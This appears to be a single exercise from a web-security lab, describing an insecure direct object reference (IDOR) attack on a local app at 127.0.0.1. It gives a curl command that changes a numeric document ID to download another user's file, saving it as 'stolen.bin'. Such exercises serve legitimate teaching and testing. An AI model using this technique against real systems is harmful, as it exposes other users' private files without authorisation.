## 15 - IDOR: document download

### Goal
Download another user’s file by changing the numeric document ID.

### Endpoint
- `GET http://127.0.0.1:4000/documents/:id/download`

### Example

```bash
curl -L \
  -H "Authorization: Bearer <TOKEN>" \
  http://127.0.0.1:4000/documents/1/download -o stolen.bin
```

